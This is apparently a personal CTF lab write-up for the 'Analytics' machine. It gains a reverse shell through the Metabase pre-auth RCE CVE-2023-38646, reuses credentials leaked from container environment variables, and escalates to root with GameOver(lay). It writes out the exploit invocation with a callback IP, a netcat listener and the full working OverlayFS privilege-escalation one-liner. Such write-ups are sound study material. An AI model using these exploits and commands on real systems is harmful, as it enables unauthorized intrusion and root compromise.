# Analytics — Easy — Linux

**Date:** 26 - August - 2026

---

## Tags

`#linux` `#web` `#metabase` `#cve-2023-38646` `#setup-token` `#h2-jdbc` `#pre-auth-rce` `#docker` `#env-variables` `#credential-disclosure` `#gameoverlay` `#cve-2023-2640` `#cve-2023-32629` `#overlayfs` `#kernel-exploit` `#privesc`

---

## What I Know

| Item       | Detail                                                                                     |
| ---------- | ------------------------------------------------------------------------------------------ |
| Target     | 10.129.229.224 (vhosts: analytical.htb, data.analytical.htb)                                |
| OS         | Ubuntu 22.04.3 LTS                                                                          |
| Open ports | 22, 80                                                                                      |
| Services   | OpenSSH 8.9p1 (22); nginx 1.18.0 -> Metabase v0.46.6 on data.analytical.htb (80)            |
| Foothold   | Metabase CVE-2023-38646 (leaked setup-token -> H2 JDBC RCE) -> shell in Docker container    |
| User       | container env vars leak `metalytics:An4lytics_ds20223#` -> SSH to host -> user.txt          |
| Privesc    | GameOver(lay) OverlayFS LPE (CVE-2023-2640 + CVE-2023-32629) -> root                        |
| Flags      | user.txt as metalytics (host); root.txt as root                                            |

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.229.224
Nmap scan report for analytical.htb (10.129.229.224)
Host is up (0.021s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.38 seconds
```

<img width="853" height="295" alt="image" src="https://github.com/user-attachments/assets/bb10b2ef-78ec-4db6-b652-85785e9c7e9e" />

```
nmap -sC -sV -p22,80 10.129.229.224
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<img width="1203" height="490" alt="image" src="https://github.com/user-attachments/assets/77ea7be8-9e6a-43d6-93f1-10beea9a16cc" />

```
# after adding analytical.htb to /etc/hosts
nmap -sC -sV -p80 10.129.229.224
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Analytical
```

<img width="1200" height="375" alt="image" src="https://github.com/user-attachments/assets/0db229c4-f752-4f2c-a333-1c4792999bad" />

**What each port tells me:**
- **Port 22 (SSH)** — OpenSSH 8.9p1 on Ubuntu. Open, but no credentials yet; a target to return to (and the eventual way onto the host once creds leak).
- **Port 80 (HTTP)** — nginx redirecting to `analytical.htb`; the web app (and its `data.` subdomain running Metabase) is the entry point. Only 22 and 80 are open.

---

## Enumeration Log

```
OBSERVATION: Port 22 is open
WHAT IT TELLS ME: I could SSH in given valid creds
WHAT I AM GOING TO TRY: Set it aside
WHY: No credentials yet
RESULT: N/A
WHAT NEXT:
- nmap shows a redirect on 80 -> add analytical.htb to /etc/hosts and investigate
- Dir-fuzz for hidden directories
- vhost-fuzz for other subdomains
- Identify the tech stack
```

```
OBSERVATION:
- analytical.htb is a single-page site; its "Login" tab redirects to data.analytical.htb
- data.analytical.htb is a Metabase login page
- Loading it fires two background requests, /api/session/properties and /api/user/current;
  searching "version" in /api/session/properties reveals Metabase v0.46.6
- dir-fuzz, vhost-fuzz and stack analysis on both domains: does not reveal anything notable
WHAT IT TELLS ME:
- Research Metabase v0.46.6 for default creds or a known CVE
WHAT I AM GOING TO TRY:
- Look up Metabase v0.46.6 vulnerabilities
WHY:
- A precise version of a well-known app often maps to a public CVE or default creds
RESULT:
- Metabase < 0.46.6.1 is vulnerable to CVE-2023-38646, a PRE-AUTH RCE. The installer leaves
  the setup-token exposed at /api/session/properties (it should be cleared post-install), and
  that token lets an unauthenticated attacker POST a malicious H2 JDBC connection string to
  /api/setup/validate, whose INIT clause executes commands
- Used a public PoC: it grabs the setup-token then triggers the
  H2 JDBC INIT RCE -> reverse shell. The shell is INSIDE a Docker container with limited tooling
- Basic enumeration of the container's ENVIRONMENT VARIABLES leaked host creds:
  metalytics:An4lytics_ds20223#
- SSH'd into the HOST as metalytics with those creds -> read user.txt
  [container is the foothold; user.txt lives on the host reached via SSH]
WHAT NEXT:
- Enumerate as metalytics for a privesc path
```

<img width="2561" height="810" alt="image" src="https://github.com/user-attachments/assets/2a6555af-71a4-4cca-8724-b3077b1ef4c2" />

> The home page of the application

<img width="2558" height="984" alt="image" src="https://github.com/user-attachments/assets/e854f28b-d332-49d1-9602-0a7250f7c5e2" />

> The login functionality in the homepage which redirects to data.analytical.htb (a metabase login page)

<img width="2100" height="716" alt="image" src="https://github.com/user-attachments/assets/73e3fbf5-6ce7-4159-9b74-5cf77fd21a9d" />

> The background request to /api/session/properties which leaks the version metabase v0.46.6

<img width="2540" height="209" alt="image" src="https://github.com/user-attachments/assets/e6f8ee76-c099-4ff9-a218-21b241377b98" />

> Searchsploit revealing that metabase v0.46.6 is vulnerable to unauth RCE (CVE-2023-38646)

<img width="857" height="364" alt="image" src="https://github.com/user-attachments/assets/3257e748-2e26-4220-893c-088b15a2ef29" />

> The usage of the exploit

<img width="1443" height="1059" alt="image" src="https://github.com/user-attachments/assets/c5253e5d-f9a1-46e1-b387-33483e592009" />

> Exploiting the vulnerability to gain access to the container and performing enumeration

<img width="1248" height="1104" alt="image" src="https://github.com/user-attachments/assets/1ca1cdbe-db4e-44de-aeac-21fe22dc7b03" />

> Environment variables leaking creds for the user metalytics:An4lytics_ds20223#

<img width="1004" height="1118" alt="image" src="https://github.com/user-attachments/assets/961a48c2-f5dc-4a58-a7b6-99ae7f7927af" />

> SSH into the host as metalytics:An4lytics_ds20223# and read user.txt

```
OBSERVATION:
- Enumerating as metalytics, nothing indicated a misconfiguration-based privesc (no sudo,
  cron, SUID, or vulnerable service stood out). So I turned to the OS/kernel version
WHAT IT TELLS ME:
- With no obvious misconfig, a kernel/OS vulnerability is the likely path
WHAT I AM GOING TO TRY:
- Research Ubuntu 22.04.3 LTS for a local privilege escalation
WHY:
- A kernel-level LPE is an easy win when userland enumeration is clean
RESULT:
- Ubuntu 22.04.3 is vulnerable to GameOver(lay): CVE-2023-2640 + CVE-2023-32629, a local
  privesc in the OverlayFS module https://medium.com/@0xrave/ubuntu-gameover-lay-loc
al-privilege-escalation-cve-2023-32629-and-cve-2023-2640-7830f9ef204a. Ran the documented capability
 check to confirm the kernel was vulnerable, then ran the public one-liner/exploit
- Got root and read root.txt
```

<img width="2539" height="229" alt="image" src="https://github.com/user-attachments/assets/2d94d05c-cbbc-443d-89ee-27c18f83c2da" />

> Enumerating with linpeas and, finding no misconfiguration-based path, turning to the Ubuntu version

<img width="1097" height="522" alt="image" src="https://github.com/user-attachments/assets/9e15d9c1-f2ec-4f59-8dd5-6e6d00c75306" />

> Research showing Ubuntu 22.04.3 is vulnerable to CVE-2023-2640 and CVE-2023-32629 (GameOver(lay))

<img width="1907" height="1020" alt="image" src="https://github.com/user-attachments/assets/734cd09c-a719-4b9a-a1c7-a2db66ab4e4f" />

> The checks detailed to confirm exploitability via CVE-2023-2640 / CVE-2023-32629

<img width="1151" height="795" alt="image" src="https://github.com/user-attachments/assets/14e2dd87-415d-45c1-8562-294793fc839d" />

> Performing checks to confirm exploitability

<img width="2530" height="150" alt="image" src="https://github.com/user-attachments/assets/aabbc869-ca87-4fe5-9766-5d5683b8e45d" />

> Performing checks to confirm exploitability

<img width="990" height="240" alt="image" src="https://github.com/user-attachments/assets/f46b6781-1063-47cf-8c0b-6b7831e174b1" />

> The exploit code used to privesc to root

<img width="2539" height="235" alt="image" src="https://github.com/user-attachments/assets/6de98812-5688-417b-a882-e04e32db466d" />

> Using the exploit to escalate to root and read root.txt

---

## Foothold

**How I got in:** The site's login redirected to `data.analytical.htb`, a **Metabase** instance whose background API calls (`/api/session/properties`) leaked the version **v0.46.6**. That version is vulnerable to **CVE-2023-38646**, a pre-auth RCE: the installer leaves the **setup-token** exposed, and that token authorizes a POST to `/api/setup/validate` carrying a malicious **H2 JDBC** connection string whose `INIT` clause runs commands. A public PoC gave a reverse shell, landing me **inside a Docker container**. Enumerating the container's **environment variables** leaked host credentials `metalytics:An4lytics_ds20223#`, which I used to **SSH into the host** for user.txt.

**Command / exploit used:**

```
# leak version from the API
curl -s http://data.analytical.htb/api/session/properties | grep -o '"version".*'   # v0.46.6

# CVE-2023-38646: leak setup-token, then H2 JDBC INIT RCE
searchsploit metabase 
searchsploit -m linux/webapps/51797.py
python3 51797.py -l 10.10.14.101 -p 4444 -P 80 -u http://data.analytical.htb/
nc -lnvp <LPORT>        # -> shell as metabase, inside a Docker container

# in the container: creds hide in env vars
env | grep -i meta      # -> META_USER=metalytics  META_PASS=An4lytics_ds20223#

# onto the host
ssh metalytics@10.129.229.224      # An4lytics_ds20223# -> user.txt
```

**Why it worked:** Metabase's setup workflow was supposed to invalidate the setup-token after installation but didn't, so the token remained readable at an unauthenticated endpoint. Because Metabase validates database connections during setup, that token let an attacker submit an H2 JDBC string whose `INIT` SQL runs arbitrary commands, a full pre-auth RCE. The exploit only reached a container, but developers had baked the host account's credentials into the container's environment variables (a common Docker mistake), so reading `env` handed over a valid SSH login to the real host.

---

## Privilege Escalation

**Path taken (metalytics -> root):** Userland enumeration as metalytics showed no sudo, cron, SUID, or vulnerable-service path, so I checked the OS: **Ubuntu 22.04.3 LTS**, vulnerable to **GameOver(lay)** (**CVE-2023-2640** + **CVE-2023-32629**), a local privilege escalation in the **OverlayFS** module. I ran the documented capability check to confirm the kernel was affected, then ran the public exploit to get a **root** shell and root.txt.

**Command / exploit used:**

```
# confirm kernel/OS
uname -r ; cat /etc/os-release        # Ubuntu 22.04.3, GameOver(lay)-vulnerable range

# GameOver(lay) one-liner (CVE-2023-2640 / CVE-2023-32629)
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;
mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &&
touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id; cat /root/root.txt")'
# -> root -> root.txt
```

**Why it worked:** GameOver(lay) abuses how Ubuntu's OverlayFS handles file capabilities during a "copy-up": an unprivileged user (using a user namespace) can stage a file with **capabilities** in the lower layer, and OverlayFS copies those capabilities up to the merged filesystem without proper checks. Setting `cap_setuid` on a copy of `python3` this way yields a binary that can call `setuid(0)`, producing a root process. It needs no misconfiguration on the box, just a vulnerable kernel, which is exactly why it was the fallback once userland enumeration came up empty.

---

### Reflection
1. **Foothold technique in one sentence:** Leaked the Metabase version from an API call, exploited the pre-auth RCE CVE-2023-38646 (setup-token -> H2 JDBC INIT) to land in a Docker container, and reused host creds found in the container's environment variables to SSH in as metalytics.
2. **Privesc technique in one sentence:** With no userland misconfig available, exploited the GameOver(lay) OverlayFS kernel LPE (CVE-2023-2640 / CVE-2023-32629) on Ubuntu 22.04.3 to get root.
